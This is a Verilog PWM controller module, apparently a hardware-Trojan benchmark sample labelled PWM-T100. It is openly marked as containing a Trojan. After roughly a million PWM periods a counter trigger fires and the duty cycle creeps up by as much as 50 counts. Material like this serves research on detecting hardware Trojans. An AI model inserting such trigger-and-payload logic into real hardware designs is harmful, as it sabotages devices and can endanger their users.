// PWM-T100: PWM controller with duty cycle manipulation Trojan

module pwm_trojan(
    input clk,
    input rst,
    input [7:0] duty_cycle,
    input enable,
    output reg pwm_out,
    output reg trojan_active
);

    reg [7:0] counter;
    reg [31:0] cycle_count;

    // Trojan: change duty cycle after many cycles
    wire Tj_trigger = (cycle_count >= 32'd1000000);
    reg [7:0] Trojan_duty_offset;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            counter <= 8'b0;
            pwm_out <= 1'b0;
            cycle_count <= 32'b0;
            Trojan_duty_offset <= 8'b0;
            trojan_active <= 1'b0;
        end else if (enable) begin
            counter <= counter + 1;

            if (counter == 8'hFF) begin
                cycle_count <= cycle_count + 1;
            end

            // Trojan: gradually increase duty offset
            if (Tj_trigger && counter == 8'b0) begin
                trojan_active <= 1'b1;
                if (Trojan_duty_offset < 8'd50) begin
                    Trojan_duty_offset <= Trojan_duty_offset + 1;
                end
            end

            // PWM output with trojan modification
            if (counter < (duty_cycle + Trojan_duty_offset)) begin
                pwm_out <= 1'b1;
            end else begin
                pwm_out <= 1'b0;
            end
        end else begin
            pwm_out <= 1'b0;
        end
    end

endmodule
